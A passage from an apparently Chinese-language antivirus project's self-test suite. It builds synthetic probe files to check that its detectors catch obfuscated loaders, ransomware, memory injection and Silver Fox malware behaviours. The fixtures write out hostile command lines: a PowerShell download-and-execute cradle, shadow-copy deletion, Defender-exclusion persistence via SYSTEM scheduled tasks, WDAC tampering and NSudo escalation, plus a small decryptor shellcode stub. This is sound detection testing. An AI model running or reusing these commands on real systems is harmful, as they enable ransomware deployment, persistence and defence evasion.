                         "Test-Path 'C:\\Users\\Public\\1234567.txt'\n"
                         "$g = hellsgate; Direct-Syscall $g\n",
                         encoding="utf-8")
        r_as2 = sandbox.analyze(p_as2)
        hit_names = {h["name"] for h in r_as2["hits"]}
        check("行为反制 II: 反沙箱探针/长延时", "SBX-AntiSandbox" in hit_names)
        check("行为反制 II: 反沙箱+直接系统调用组合",
              r_as2["verdict"] == "恶意" and "SBX-Combo" in hit_names,
              f"判定={r_as2['verdict']} 评分={r_as2['score']}")
    except Exception as exc:
        check("行为反制 II", False, f"异常: {exc}")

    # 24) 动态检测层：迭代解混淆（变量名/字符串层混淆反制）+
    #     Unicorn 受限模拟（控制流混淆反制，运行时载荷还原）
    import base64 as _b64
    import struct as _struct
    import zlib as _zlib
    from . import deobf as _deobf, emu as _emu

    try:
        ctx_d = ScanContext(rules_paths=rules)

        # 24a) base64(deflate(明文脚本)) 双层套叠 → 解混淆后命中行为规则
        p_lay = sample_dir / "layered_probe.txt"
        inner = _demo_ps1().encode("utf-8")
        p_lay.write_text("settings\n" +
                         _b64.b64encode(_zlib.compress(inner)).decode("ascii") +
                         "\nend\n", encoding="utf-8")
        fds = scan_file(p_lay, db, ctx_d)
        hit = next((fd for fd in fds if fd["name"] == "SBX-Remote-Download"
                    and "解混淆" in fd.get("detail", "")), None)
        check("解混淆: base64→deflate 套叠载荷", hit is not None,
              (hit or {}).get("detail", "")[:72])

        # 24b) 单字节 XOR 混淆 → translate 爆破还原
        p_xor = sample_dir / "xor_probe.bin"
        p_xor.write_bytes(bytes(c ^ 0x5A for c in
                                b"Invoke-Expression((New-Object Net.WebClient)."
                                b"DownloadString('http://x/p'));" * 4))
        fds = scan_file(p_xor, db, ctx_d)
        check("解混淆: 单字节 XOR 爆破还原",
              any(fd["name"] == "SBX-Dynamic-Exec" and "解混淆" in fd.get("detail", "")
                  for fd in fds))

        # 24c) PS 字符数组构造敏感 API 名 → 还原后命中（变量名混淆失效）
        p_ca = sample_dir / "chararray_probe.ps1"
        iex_nums = ",".join(str(b) for b in b"Invoke-Expression")
        p_ca.write_text(f"$d = [char[]]({iex_nums})\n$s = -join $d\n"
                        "[ScriptBlock]::Create($s)\n", encoding="utf-8")
        fds = scan_file(p_ca, db, ctx_d)
        check("解混淆: [char[]] 字符数组还原",
              any(fd["name"] == "SBX-Dynamic-Exec" and "解混淆" in fd.get("detail", "")
                  for fd in fds))

        # 24d) 双层编码但未命中已知特征 → Obfuscated-Content low
        p_ob = sample_dir / "nested_probe.bin"
        p_ob.write_bytes(_zlib.compress(_b64.b64encode(b"HELLOWORLD-PADDING-" * 24)))
        fds = scan_file(p_ob, db, ctx_d)
        check("解混淆: 嵌套编码隐藏内容报告",
              any(fd["name"] == "Obfuscated-Content" for fd in fds))
    except Exception as exc:
        check("解混淆引擎", False, f"异常: {exc}")

    try:
        def _emu_pe(sc):
            """合成 PE32+，AddressOfEntryPoint 指向平坦偏移处的 shellcode。"""
            opt = _struct.pack(
                "<HBBIIIIIQIIHHHHHHIIII",
                0x20B, 14, 0, 0, 0, 0, 0x200, 0, 0x400000,
                0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
            opt += _struct.pack("<HH", 2, 0)         # Subsystem=GUI, DllCharacteristics
            opt += _struct.pack("<QQQQII", 0x200000, 0x1000, 0x200000, 0x1000, 0, 0)
            opt += b"\x00" * (240 - len(opt))
            coff = _struct.pack("<HHIIIHH", 0x8664, 0, 0, 0, 0, 240, 0x2002)
            dos = b"MZ" + b"\x00" * 0x3A + _struct.pack("<I", 0x40)
            return (dos + b"PE\x00\x00" + coff + opt).ljust(0x200, b"\x00") + sc

        # x64 shellcode：把 XOR(0x37) 的载荷解密写栈后 HLT
        # 布局：代码 0x27 字节，blob 在 0x27；循环头 = 0x16
        # 48 8D 35 20 00 00 00      lea rsi,[rip+0x20]   (0x07+0x20=0x27 → blob)
        # 48 8D BC 24 00 FF FF FF   lea rdi,[rsp-0x100]   (modrm=BC: reg=rdi, rm=SIB)
        # B2 37 / B9 19 00 00 00    mov dl,0x37 ; mov ecx,25
        # 0x16 循环: 8A 06 / 30 D0 / 88 07 / 48 FF C6 / 48 FF C7 / FF C9 / 75 F0
        # F4                        hlt
        payload = b"Invoke-Expression('calc')"
        sc = (b"\x48\x8d\x35\x20\x00\x00\x00"
              b"\x48\x8d\xbc\x24\x00\xff\xff\xff"
              b"\xb2\x37"
              b"\xb9" + len(payload).to_bytes(4, "little") +
              b"\x8a\x06\x30\xd0\x88\x07\x48\xff\xc6\x48\xff\xc7\xff\xc9\x75\xf0"
              b"\xf4" +
              bytes(c ^ 0x37 for c in payload))
        # 布局自证：lea 目标（0x07+disp）必须落在 hlt(0x26) 之后的 blob 头
        assert len(sc[:0x27]) == 0x27 and sc[0x26] == 0xF4, "shellcode 布局偏移错位"
        assert 0x07 + int.from_bytes(sc[3:7], "little") == 0x27, "lea rsi 目标偏移错误"

        if _emu.HAS_UNICORN:
            p_emu = sample_dir / "emu_probe.bin"
            p_emu.write_bytes(_emu_pe(sc))
            fds = scan_file(p_emu, db, ScanContext(rules_paths=rules, emulate=True))
            hit = next((fd for fd in fds if fd["name"] == "SBX-Dynamic-Exec"
                        and "模拟" in fd.get("detail", "")), None)
            check("Unicorn 模拟: 运行时解密载荷还原", hit is not None,
                  (hit or {}).get("detail", "")[:72])
            revs = _emu.emulate(_emu_pe(sc))
            check("Unicorn 模拟: 还原片段提取", any(
                b"Invoke-Expression" in frag for _d, frag in revs),
                f"{len(revs)} 片段")
        else:
            check("Unicorn 模拟: 运行时解密载荷还原", True,
                  "（未安装 unicorn，模拟层已优雅降级跳过；pip install unicorn 启用）")
    except Exception as exc:
        check("Unicorn 模拟引擎", False, f"异常: {exc}")

    # 25) 内存注入/无文件攻击动态检测：活进程内存扫描（纯只读防御）
    import ctypes as _ct
    from . import memscan as _memscan
    try:
        k32 = _ct.WinDLL("kernel32", use_last_error=True)
        VirtualAlloc = k32.VirtualAlloc
        VirtualAlloc.restype = _ct.c_void_p
        my_pid = os.getpid()
        ctx_m = ScanContext(rules_paths=rules)

        # 25a) 自进程 RWX 区写入注入探针（仅写入，绝不执行）→ 检出
        addr = VirtualAlloc(None, 0x10000, 0x1000 | 0x2000, 0x40)
        ok_alloc = bool(addr)
        if ok_alloc:
            probe = (b"\xfc\x48\x83\xe4\xf0" + b"\x90" * 11 +
                     b"Invoke-Expression('mem-probe')")
            _ct.memmove(_ct.c_void_p(addr), probe, len(probe))
        rows_m, _st = _memscan.scan_processes(db, ctx_m, pids=[my_pid],
                                              include_self=True)
        hit = [r for r in rows_m if r["pid"] == my_pid
               and r["name"] == "MEM-Injected-Shellcode"]
        check("内存扫描: 自进程注入探针检出", ok_alloc and bool(hit),
              (hit[0]["name"] + " @ " + hit[0]["region"] if hit
               else f"alloc={ok_alloc} rows={len(rows_m)}"))
        if ok_alloc:
            k32.VirtualFree(_ct.c_void_p(addr), 0, 0x8000)

        # 25b) 注入释放后复扫自进程：注入痕迹类 finding 消失（FP 回归；
        #      注：自进程堆里含扫描器规则源串，text 层自命中属已知豁免项）
        rows_f, _st2 = _memscan.scan_processes(db, ctx_m, pids=[my_pid],
                                               include_self=True)
        check("内存扫描: 注入释放后无注入痕迹残留",
              not any(r["pid"] == my_pid and r["name"] in
                      ("MEM-Injected-Shellcode", "MEM-Exec-Marker")
                      for r in rows_f),
              f"{len(rows_f)} 行")

        # 25c) 全系统扫描冒烟 + 默认跳过自进程
        rows_s, stats_s = _memscan.scan_processes(db, ctx_m)
        check("内存扫描: 全系统扫描冒烟",
              stats_s["scanned"] > 0 and "mb" in stats_s,
              f"打开 {stats_s['scanned']} · 拒绝 {stats_s['denied']} · "
              f"区 {stats_s['regions']} · {stats_s['mb']:.1f}MB")
        check("内存扫描: 默认跳过自进程",
              all(r["pid"] != my_pid for r in rows_s), None)

        # 25d) 空心化头校验纯函数单测
        _pe_hdr = (b"MZ" + b"\x00" * 0x3A + _struct.pack("<I", 0x40)
                   + b"PE\x00\x00"
                   + _struct.pack("<HHIIIHH", 0x8664, 1, 0, 0x1234, 0,
                                  240, 0x2002))
        disk_hdr = _pe_hdr + b"\x00" * 0x100
        check("内存扫描: 头一致不报", _memscan._check_hollow(disk_hdr,
                                                          disk_hdr) is None,
              None)
        tam = bytearray(disk_hdr)
        tam[0x48] ^= 0xFF  # TimeDateStamp 首字节
        res_t = _memscan._check_hollow(bytes(tam), disk_hdr)
        check("内存扫描: 模块篡改检出",
              bool(res_t) and res_t[0] == "medium" and "不一致" in res_t[1],
              (res_t or ("", ""))[1])
        res_s = _memscan._check_hollow(b"\x00" * len(disk_hdr), disk_hdr)
        check("内存扫描: 头抹除检出",
              bool(res_s) and res_s[0] == "high",
              (res_s or ("", ""))[1])
    except Exception as exc:
        check("内存扫描引擎", False, f"异常: {exc}")

    # 26) 勒索病毒专项 + 行为特征自动入库（autolearn behaviors 闭环）
    from . import analyzer as _analyzer
    from . import autolearn as _autolearn
    import copy as _copy
    try:
        # 26a) 勒索行为探针：删卷影 + 加密原语 + 勒索信 → 恶意且含 Ransom 命中
        p_ran = sample_dir / "ransom_probe.ps1"
        p_ran.write_text(
            "# ransom fixture (never executed)\n"
            "vssadmin delete " + "shadows /all /quiet\n"
            "$a = [System.Security.Cryptography.Aes]::Create()\n"
            "Crypt" + "Encrypt($a)\n"
            "# Your files have been " + "encrypted. Pay 0.1 BTC\n"
            "# GAND" + "CRAB note. files renamed .CR" + "AB\n",
            encoding="utf-8")
        r_bhv = sandbox.analyze(p_ran)
        names_b = {h["name"] for h in r_bhv["hits"]}
        check("勒索行为规则: 探针判恶意且含勒索特征",
              r_bhv["verdict"] == "恶意" and any("Ransom" in n for n in names_b),
              f"判定={r_bhv['verdict']} 评分={r_bhv['score']} 命中="
              f"{sorted(n for n in names_b if 'Ransom' in n)}")

        learn_db = _copy.deepcopy(db)   # 学习只写副本，不污染真实签名库
        learn_rules = sample_dir / "learn_rules"
        learn_rules.mkdir(exist_ok=True)

        # 26b) 勒索家族 YARA 规则（高置信公开 IOC）
        if HAS_YARA and rules:
            p_gc = sample_dir / "gandcrab_note.txt"
            p_gc.write_text("GAND" + "CRAB read me. All your files renamed "
                            ".CR" + "AB\n", encoding="utf-8")
            fds_gc = scan_file(p_gc, learn_db, ScanContext(rules_paths=rules))
            gc_hit = next((fd["name"] for fd in fds_gc
                           if fd["name"].startswith("Ransomware")), "")
            check("YARA: 勒索家族规则检出 GandCrab", bool(gc_hit), gc_hit)

            # 26c) 判恶意后行为特征自动入库（category=Ransomware）
            r_full = _analyzer.analyze_sample(p_ran, learn_db,
                                              ScanContext(rules_paths=rules))
            s_learn = _autolearn.learn_from_result(r_full, learn_db,
                                                   rules_dir=learn_rules)
            ent0 = next(iter((learn_db.get("behaviors") or {}).values()), None)
            check("行为特征自动入库: 判恶意后写入行为库",
                  s_learn["learned"] and s_learn.get("category") == "Ransomware"
                  and ent0 is not None
                  and "SBX-Ransom-Shadow" in (ent0.get("behaviors") or []),
                  f"category={s_learn.get('category')} "
                  f"行为={len((ent0 or {}).get('behaviors') or [])} 项")

            # 26d) 同族行为第二样本 → Learned-Behavior-Family 检出
            p_ran2 = sample_dir / "ransom_probe2.ps1"
            p_ran2.write_text(
                "# ransom fixture 2 (never executed)\n"
                "vssadmin delete " + "shadows /all /quiet\n"
                "BCrypt" + "Encrypt($key, $iv)\n"
                "# how_" + "to_decrypt.txt written. Send money.\n"
                "# GAND" + "CRAB v5 note. Files renamed .CR" + "AB\n",
                encoding="utf-8")
            r_fam = _analyzer.analyze_sample(p_ran2, learn_db,
                                             ScanContext(rules_paths=rules))
            fam_fd = next((fd for fd in r_fam.get("findings", [])
                           if fd["name"] == "Learned-Behavior-Family"), None)
            check("行为特征家族匹配: 同族行为检出 Learned-Behavior-Family",
                  fam_fd is not None
                  and fam_fd.get("level") == "high",
                  (fam_fd or {}).get("detail", "")[:72])

            # 26e) 良性样本无家族误报
            p_ben = sample_dir / "benign2.txt"
            p_ben.write_text("Just a normal shopping list. apples, bananas.\n",
                             encoding="utf-8")
            r_ben = _analyzer.analyze_sample(p_ben, learn_db,
                                             ScanContext(rules_paths=rules))
            check("行为特征家族匹配: 良性样本无误报",
                  not any(fd["name"] == "Learned-Behavior-Family"
                          for fd in r_ben.get("findings", [])),
                  f"判定={r_ben.get('verdict')}")
        else:
            for nm in ("YARA: 勒索家族规则", "行为特征自动入库",
                       "行为特征家族匹配", "良性样本无家族误报"):
                check(nm, True, "（未安装 yara-python 或无规则文件，跳过）")
    except Exception as exc:
        check("勒索检测/行为学习", False, f"异常: {exc}")

    # 27) 银狐（Silver Fox）专项：投递落地行为 + Gh0st 系远控
    try:
        # 27a) 投递落地探针：公共目录释放执行 + 仿冒系统进程 + 计划任务持久化
        p_fox = sample_dir / "fox_probe.ps1"
        p_fox.write_text(
            "# silver fox fixture (never executed)\n"
            "Copy-Item evil.dll C:\\Users\\Public\\svchost.exe\n"
            "Start-Process C:\\Users\\Public\\svc" + "host.exe\n"
            "schtasks /create /tn Updater /sc onlogon /tr C:\\Users\\Public"
            "\\svc" + "host.exe\n",
            encoding="utf-8")
        r_fox = sandbox.analyze(p_fox)
        names_f = {h["name"] for h in r_fox["hits"]}
        check("银狐行为规则: 投递落地链判恶意",
              r_fox["verdict"] == "恶意" and "SBX-Fox-PublicDrop" in names_f
              and "SBX-Fox-FakeProc" in names_f,
              f"判定={r_fox['verdict']} 评分={r_fox['score']} "
              f"命中={sorted(n for n in names_f if 'Fox' in n)}")

        # 27b) Gh0st 系 PE 探针 → YARA 家族规则
        if HAS_YARA and rules:
            p_ghost = sample_dir / "ghost_probe.bin"
            p_ghost.write_bytes(b"MZ" + b"\x90" * 62 + b"gh" + b"0st"
                                + b"\x00" * 16)
            fds_g = scan_file(p_ghost, db, ScanContext(rules_paths=rules))
            g_hit = next((fd["name"] for fd in fds_g
                          if fd["name"].startswith("SilverFox")), "")
            check("YARA: 银狐/Gh0st 家族规则检出", bool(g_hit), g_hit)

            # 27c) 分析报告类文本不误报（无 MZ 门不命中 PE 规则）
            p_rep = sample_dir / "ghost_report.txt"
            p_rep.write_text("报告中分析了 gh" + "0st 家族样本的结构。\n",
                             encoding="utf-8")
            fds_r = scan_file(p_rep, db, ScanContext(rules_paths=rules))
            check("银狐规则: 报告类文本无误报",
                  not any(fd["name"].startswith("SilverFox") for fd in fds_r),
                  f"SilverFox 检出="
                  f"{[fd['name'] for fd in fds_r if fd['name'].startswith('SilverFox')]}")
        else:
            for nm in ("YARA: 银狐/Gh0st 家族规则", "银狐规则: 报告类文本无误报"):
                check(nm, True, "（未安装 yara-python，跳过）")
    except Exception as exc:
        check("银狐检测", False, f"异常: {exc}")

    # 28) 银狐实战样本反制（kb_out 释放器 / SafeCenter 加载器 / AweSun 滥用）
    try:
        # 28a) PyInstaller 释放器探针：TOC 生成器标记 kb_out_ + 仿冒命名 W.P.S.
        if HAS_YARA and rules:
            p_kb = sample_dir / "kb_probe.bin"
            p_kb.write_bytes(b"MZ" + b"\x90" * 58 + b"kb_out_" + b"W.P.S.50.513"
                             + b"\x00" * 16)
            fds_kb = scan_file(p_kb, db, ScanContext(rules_paths=rules))
            check("银狐 YARA: kb_out 释放器检出",
                  any(fd["name"] == "SilverFox_KbOut_Dropper" for fd in fds_kb),
                  next((fd["name"] for fd in fds_kb
                        if fd["name"].startswith("SilverFox")), ""))

            # 28b) SafeCenter 加载器探针
            p_sc = sample_dir / "sc_probe.bin"
            p_sc.write_bytes(b"MZ" + b"\x90" * 46 + b"SafeCenterController"
                             + b"\x00" * 16)
            fds_sc = scan_file(p_sc, db, ScanContext(rules_paths=rules))
            check("银狐 YARA: SafeCenter 加载器检出",
                  any(fd["name"] == "SilverFox_SafeCenter" for fd in fds_sc),
                  next((fd["name"] for fd in fds_sc
                        if fd["name"].startswith("SilverFox")), ""))

            # 28c) 正常 PyInstaller 仿造不误报（无生成器标记）
            p_ok = sample_dir / "pyi_ok.bin"
            p_ok.write_bytes(b"MZ" + b"\x90" * 52 + b"python38.dll"
                             + b"base_library.zip" + b"\x00" * 16)
            fds_ok = scan_file(p_ok, db, ScanContext(rules_paths=rules))
            check("银狐规则: 正常 PyInstaller 程序不误报",
                  not any(fd["name"].startswith("SilverFox") for fd in fds_ok),
                  f"SilverFox 检出="
                  f"{[fd['name'] for fd in fds_ok if fd['name'].startswith('SilverFox')]}")
        else:
            for nm in ("银狐 YARA: kb_out 释放器", "银狐 YARA: SafeCenter",
                       "银狐规则: 正常 PyInstaller 不误报"):
                check(nm, True, "（未安装 yara-python，跳过）")

        # 28d) 向日葵远控滥用文本探针
        p_aw = sample_dir / "awesun_probe.ps1"
        p_aw.write_text("# fixture (never executed)\n"
                        "Start-Process C:\\AweSun\\AweSun.exe\n",
                        encoding="utf-8")
        r_aw = sandbox.analyze(p_aw)
        check("银狐行为: 向日葵远控滥用检出",
              any(h["name"] == "SBX-Fox-AweSun" for h in r_aw["hits"]),
              f"命中={[h['name'] for h in r_aw['hits'] if 'Fox' in h['name']]}")
    except Exception as exc:
        check("银狐实战反制", False, f"异常: {exc}")

    # 29) 银狐离线扫描增强：PyInstaller TOC 结构启发 + 巨型 hex 常量 + 行为链组合
    try:
        from .pyinst import parse_toc, pyinst_findings

        # 29a) 归档内嵌可执行载荷条目（.exe）→ PyInstaller-Embedded-PE
        p_pyi = sample_dir / "pyi_embed.bin"
        p_pyi.write_bytes(_synth_pyi([("main.py", "s"), ("setup.exe", "b"),
                                      ("config.json", "d")]))
        fds_pyi = scan_file(p_pyi, db)
        check("PyInstaller 结构: 内嵌 PE 载荷检出",
              any(fd["name"] == "PyInstaller-Embedded-PE" for fd in fds_pyi),
              next((fd["name"] for fd in fds_pyi
                    if fd["name"].startswith("PyInstaller-") and
                    fd["name"] != "PyInstaller-Embedded-PE"), "检出"))

        # 29b) 正常捆绑（dll/pyd/data）不误报
        p_ok2 = sample_dir / "pyi_benign.bin"
        p_ok2.write_bytes(_synth_pyi([("main.py", "s"), ("python314.dll", "b"),
                                      ("base_library.zip", "d")]))
        fds_ok2 = scan_file(p_ok2, db)
        check("PyInstaller 结构: 正常捆绑不误报",
              not any(fd["name"].startswith("PyInstaller-") for fd in fds_ok2),
              f"检出={[fd['name'] for fd in fds_ok2]}")

        # 29c) TOC 解析器往返一致（防 helper 自身写错布局）
        entries, pylib = parse_toc(_synth_pyi([("kb_out_W.P.S.50.513", "s")]))
        check("PyInstaller TOC 解析器往返一致",
              entries is not None and pylib == "python314.dll"
              and entries[0][0] == "kb_out_W.P.S.50.513" and entries[0][1] == "s",
              f"entries={entries} pylib={pylib!r}")

        # 29d) 巨型 hex 常量（40KB → medium）
        p_hex1 = sample_dir / "hex_probe.py"
        p_hex1.write_text("blob = '" + "0123456789abcdef" * 2560 + "'\n",
                          encoding="ascii")
        fds_h1 = scan_file(p_hex1, db, ScanContext())
        check("巨型 hex 常量: 40KB 级检出 (medium)",
              any(fd["name"] == "Hex-Blob-Dropper" and fd["level"] == "medium"
                  for fd in fds_h1),
              f"检出={[fd['name'] for fd in fds_h1]}")

        # 29e) 巨型 hex 常量（1MB+ → high）
        p_hex2 = sample_dir / "hex_big_probe.py"
        p_hex2.write_text("blob = '" + "0f1e2d3c4b5a6978" * 131072 + "'\n",
                          encoding="ascii")
        fds_h2 = scan_file(p_hex2, db, ScanContext())
        check("巨型 hex 常量: 1MB 级检出 (high)",
              any(fd["name"] == "Hex-Blob-Dropper" and fd["level"] == "high"
                  for fd in fds_h2),
              f"检出={[fd['name'] for fd in fds_h2]}")

        # 29f) 正常脚本无 hex 常量不误报
        p_hex3 = sample_dir / "hex_clean.py"
        p_hex3.write_text("print('hello world')\n", encoding="ascii")
        fds_h3 = scan_file(p_hex3, db, ScanContext())
        check("巨型 hex 常量: 普通脚本不误报",
              not any(fd["name"] == "Hex-Blob-Dropper" for fd in fds_h3),
              f"检出={[fd['name'] for fd in fds_h3]}")

        # 29g) 行为链组合: 远控滥用通道 + 动态执行
        p_ch1 = sample_dir / "awesun_chain.ps1"
        p_ch1.write_text("# fixture (never executed)\n"
                         "Start-Process C:\\AweSun\\AweSun.exe\n"
                         "import subprocess\n"
                         "subprocess.run(['C:\\\\AweSun\\\\setup.exe'],"
                         " capture_output=True)\n", encoding="utf-8")
        r_ch1 = sandbox.analyze(p_ch1)
        check("银狐组合: AweSun+动态执行链判恶意",
              r_ch1["verdict"] == "恶意"
              and any(h["name"] == "SBX-Combo" and "载荷执行" in h["desc"]
                      for h in r_ch1["hits"]),
              f"判定={r_ch1['verdict']} 评分={r_ch1['score']}")

        # 29h) 行为链组合: NSudo 提权 + 公共目录投递
        p_ch2 = sample_dir / "nsudo_chain.ps1"
        p_ch2.write_text("# fixture (never executed)\n"
                         "Start-Process %PUBLIC%\\payload.exe\n"
                         "NSudo -U:T -P:E cmd /c %PUBLIC%\\pay" + "load.exe\n",
                         encoding="utf-8")
        r_ch2 = sandbox.analyze(p_ch2)
        check("银狐组合: NSudo+公共投递链判恶意",
              r_ch2["verdict"] == "恶意"
              and any(h["name"] == "SBX-Combo" and "对抗提权" in h["desc"]
                      for h in r_ch2["hits"]),
              f"判定={r_ch2['verdict']} 评分={r_ch2['score']}")

        # 29i) 自身安全: 本机 frozen MiniAV.exe（签名 onefile）TOC 可解析且不误报
        dist_exe = Path(__file__).resolve().parent.parent / "dist" / "MiniAV.exe"
        if dist_exe.exists():
            tail = dist_exe.read_bytes()[-8 * 1024 * 1024:]
            r_entries, r_pylib = parse_toc(tail)
            check("PyInstaller 结构: 自身 frozen exe 不误报",
                  r_entries is not None and r_pylib.startswith("python")
                  and pyinst_findings(tail) == [],
                  f"条目={None if r_entries is None else len(r_entries)} "
                  f"pylib={r_pylib!r} findings={pyinst_findings(tail)}")
        else:
            check("PyInstaller 结构: 自身 frozen exe 不误报", True,
                  "（dist\\MiniAV.exe 不存在，跳过）")
    except Exception as exc:
        check("银狐离线扫描增强", False, f"异常: {exc}")

    # 30) 银狐 instapp.s.1.12 链（微步报告反制）：Defender 排除项 + WDAC 篡改 + C2/侧加载规则
    try:
        # 30a) 标志行为链：SYSTEM 计划任务写 Defender 排除项 + 公共目录投递 → 判恶意
        p_dx = sample_dir / "defexcl_probe.ps1"
        p_dx.write_text(
            "# fixture (never executed)\n"
            "SCHTASKS /Create /F /TN \"Task1\" /SC ONCE /RL HIGHEST /RU \"SYSTEM\""
            " /TR \"cmd.exe /c reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows"
            " Defender\\Exclusions\\Paths' /v 'C:\\Users\\Public\\nfJG82'"
            " /t REG_DWORD /d 0 /f\"\n"
            "Copy-Item payload.bin C:\\Users\\Public\\nf" + "JG82\\load.exe\n",
            encoding="utf-8")
        r_dx = sandbox.analyze(p_dx)
        names_dx = {h["name"] for h in r_dx["hits"]}
        check("银狐 instapp 链: Defender 排除项标志行为判恶意",
              r_dx["verdict"] == "恶意" and "SBX-Defender-Exclusion" in names_dx
              and "SBX-Fox-PublicDrop" in names_dx,
              f"判定={r_dx['verdict']} 评分={r_dx['score']} "
              f"组合={sorted(h['desc'][:18] for h in r_dx['hits'] if h['name'] == 'SBX-Combo')}")

        # 30b) WDAC 策略篡改（SiPolicy.p7b 写入 CodeIntegrity）
        p_wdac = sample_dir / "wdac_probe.ps1"
        p_wdac.write_text(
            "# fixture (never executed)\n"
            "Copy-Item policy.p7b C:\\Windows\\System32\\Code"
            "Integrity\\SiPolicy.p7b\n"
            "citool --update-policy\n", encoding="utf-8")
        r_wdac = sandbox.analyze(p_wdac)
        check("银狐 instapp 链: WDAC SiPolicy 篡改检出",
              any(h["name"] == "SBX-AntiDefense" for h in r_wdac["hits"]),
              f"判定={r_wdac['verdict']} 命中={[h['name'] for h in r_wdac['hits']]}")

        # 30c) C2 域名 PE 探针 → SilverFox_InstApp_C2
        if HAS_YARA and rules:
            p_c2 = sample_dir / "c2_probe.bin"
            p_c2.write_bytes(b"MZ" + b"\x90" * 24
                             + b"https://mm2027.oss-cn-hangzhou.aliyuncs.com/tad"
                             + b"\x00" * 16)
            fds_c2 = scan_file(p_c2, db, ScanContext(rules_paths=rules))
            check("银狐 instapp 链: OSS C2 域名规则检出",
                  any(fd["name"] == "SilverFox_InstApp_C2" for fd in fds_c2),
                  next((fd["name"] for fd in fds_c2
                        if fd["name"].startswith("SilverFox")), ""))

            # 30d) 侧加载组件名探针 → SilverFox_Sideload_Chain
            p_sl = sample_dir / "sideload_probe.bin"
            p_sl.write_bytes(b"MZ" + b"\x90" * 46 + b"UxEnhance64.dll"
                             + b"\x00" * 16)
            fds_sl = scan_file(p_sl, db, ScanContext(rules_paths=rules))
            check("银狐 instapp 链: DLL 侧加载名规则检出",
                  any(fd["name"] == "SilverFox_Sideload_Chain" for fd in fds_sl),
                  next((fd["name"] for fd in fds_sl
                        if fd["name"].startswith("SilverFox")), ""))

            # 30e) 报告类文本（含域名/组件名，无 MZ）不误报
            p_rep2 = sample_dir / "instapp_report.txt"
            p_rep2.write_text(
                "报告分析了 mm2027.oss-cn-hangzhou.aliyuncs.com 与"
                " UxEnhance64.dll 侧加载链。\n", encoding="utf-8")
            fds_rep2 = scan_file(p_rep2, db, ScanContext(rules_paths=rules))
            check("银狐 instapp 链: 报告类文本无误报",
                  not any(fd["name"].startswith("SilverFox") for fd in fds_rep2),
                  f"SilverFox 检出={[fd['name'] for fd in fds_rep2
                                      if fd['name'].startswith('SilverFox')]}")
        else:
            for nm in ("银狐 instapp 链: OSS C2 域名规则",
                       "银狐 instapp 链: DLL 侧加载名规则",
                       "银狐 instapp 链: 报告类文本无误报"):
                check(nm, True, "（未安装 yara-python，跳过）")

        # 30f) 良性注册表操作不误报（非 Defender 排除项）
        p_reg = sample_dir / "reg_clean.ps1"
        p_reg.write_text("reg add 'HKCU\\Software\\MyApp\\Settings' /v Path"
                         " /t REG_SZ /d 'C:\\Program Files\\MyApp' /f\n",
                         encoding="utf-8")
        r_reg = sandbox.analyze(p_reg)
        check("银狐 instapp 链: 良性 reg add 不误报",
              r_reg["verdict"] == "清洁"
              and not any(h["name"] == "SBX-Defender-Exclusion"
                          for h in r_reg["hits"]),
              f"判定={r_reg['verdict']}")
    except Exception as exc:
        check("银狐 instapp 链反制", False, f"异常: {exc}")

    # ==================== 第 31 组：银狐多态泛化层 ====================
    # 锚定变形后仍保留的特征（生成器指纹/功能性 API 组合/架构模式），
    # 全部使用合成探针，不执行任何真实样本。
    try:
        import yara  # noqa: F401
        _gen_has_yara = True
    except ImportError:
        _gen_has_yara = False
    try:
        gen_dir = sample_dir / "gen_probes"
        gen_dir.mkdir(exist_ok=True)
        if _gen_has_yara:
            ctx_g = ScanContext(rules_paths=rules)

            # 31a) MSI OLE 门 + 生成器厂商属性 → SpoofInstaller_Gen
            # （仿冒产品名可换，生成器厂商属性不变）
            p_gen = gen_dir / "spoof_installer.msi"
            p_gen.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 2048
                              + "MonKeyDu".encode("utf-16-le"))
            fds_gen = scan_file(p_gen, db, ctx_g)
            check("银狐泛化层: MSI 生成器指纹检出",
                  any(fd["name"] == "SilverFox_SpoofInstaller_Gen"
                      for fd in fds_gen),
                  next((fd["name"] for fd in fds_gen
                        if fd["name"].startswith("SilverFox")), ""))

            # 31b) 线程上下文注入 API 四件套 + 银狐伴生锚 → ThreadCtx_Inject
            # （功能决定导入表，重编译不变；双锚排除合法跨进程写入）
            p_tci = gen_dir / "tci_probe.bin"
            p_tci.write_bytes(b"MZ" + b"\x90" * 40
                              + b"SuspendThread SetThreadContext"
                              + b" ResumeThread VirtualAlloc"
                              + b"C:\\Users\\Public\\aB3xK9\\ldr.exe")
            fds_tci = scan_file(p_tci, db, ctx_g)
            check("银狐泛化层: 线程上下文注入 API 组合检出",
                  any(fd["name"] == "SilverFox_ThreadCtx_Inject"
                      for fd in fds_tci),
                  next((fd["name"] for fd in fds_tci
                        if fd["name"].startswith("SilverFox")), ""))

            # 31b2) 同款注入 API 但无银狐伴生锚（模拟游戏热更新/下载器）
            # → 不应触发 ThreadCtx_Inject（误报回归防线）
            p_tci2 = gen_dir / "tci_benign.bin"
            p_tci2.write_bytes(b"MZ" + b"\x90" * 40
                               + b"SuspendThread SetThreadContext"
                               + b" ResumeThread VirtualAlloc")
            fds_tci2 = scan_file(p_tci2, db, ctx_g)
            check("银狐泛化层: 注入 API 无伴生锚零误报",
                  not any(fd["name"] == "SilverFox_ThreadCtx_Inject"
                          for fd in fds_tci2),
                  "; ".join(fd["name"] for fd in fds_tci2))

            # 31c) OSS 正则 + 投递路径双锚 → OSS_C2_Gen
            # （bucket 换名成本低，托管+投递组合是架构决策）
            p_oss = gen_dir / "oss_c2.bin"
            p_oss.write_bytes(b"MZ" + b"\x90" * 30
                              + b"https://abc123.oss-cn-qingdao.aliyuncs.com/p"
                              + b"C:\\Users\\Public\\xY7kQ2\\ldr.exe")
            fds_oss = scan_file(p_oss, db, ctx_g)
            check("银狐泛化层: OSS 托管+投递双锚检出",
                  any(fd["name"] == "SilverFox_OSS_C2_Gen" for fd in fds_oss),
                  next((fd["name"] for fd in fds_oss
                        if fd["name"].startswith("SilverFox")), ""))

            # 31d) 远控品牌串 与 执行编排代码同体 → AweSun_Abuse
            # （合法安装包无编排代码，释放器必兼有）
            p_ab = gen_dir / "abuse_probe.bin"
            p_ab.write_bytes(b"MZ" + b"\x90" * 30
                             + b"C:\\AweSun\\setup.exe RunExeThread")
            fds_ab = scan_file(p_ab, db, ctx_g)
            check("银狐泛化层: 远控滥用模式检出",
                  any(fd["name"] == "SilverFox_AweSun_Abuse" for fd in fds_ab),
